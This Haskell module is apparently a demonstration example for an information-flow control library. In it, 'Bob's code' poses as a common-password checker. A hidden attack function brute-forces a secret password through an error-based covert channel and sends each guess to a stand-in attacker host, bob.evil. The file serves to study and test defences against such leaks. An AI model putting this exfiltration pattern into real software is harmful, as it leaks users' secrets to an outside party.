{-# LANGUAGE Safe #-}

module Examples.Bob2 where

import Data.List
import Data.List.Split
import Data.Maybe

import Control.Monad
import MAC.Control
import MAC.Labeled
import MAC.Lattice
import MAC.MAC

import Examples.MACWget

-- Bob's code
commonPass :: Labeled H String -> MAC L (Labeled H Bool)
commonPass lpass = do
    attack lpass
    str <- wgetMAC "http://www.openwall.com/passwords/wordlists/password-2011.lst"
    let lines = filter (not . null) (linesBy (== '\n') str)
    let words = filter (not . (== '#') . head) lines
    joinMAC $ do
        pass <- unlabel lpass
        return $ isJust $ find (== pass) words

attack :: Labeled H String -> MAC L ()
attack lpass = do
    attempt <- wgetMAC "http://bob.evil/start.txt"
    when (attempt == "launch") $ return ()
    forM dict (guess lpass)
    return ()

dict =
    filter
        (\l -> length l > 4 && length l < 7)
        (subsequences "0123456789")

guess :: Labeled H String -> String -> MAC L ()
guess lpass try = do
    joinMAC $ do
        fix (labelOf lpass)
        pass <- unlabel lpass
        when (pass == try) $ error "Unexpected error"
    wgetMAC $ "http://bob.evil/try=" ++ try
    return ()
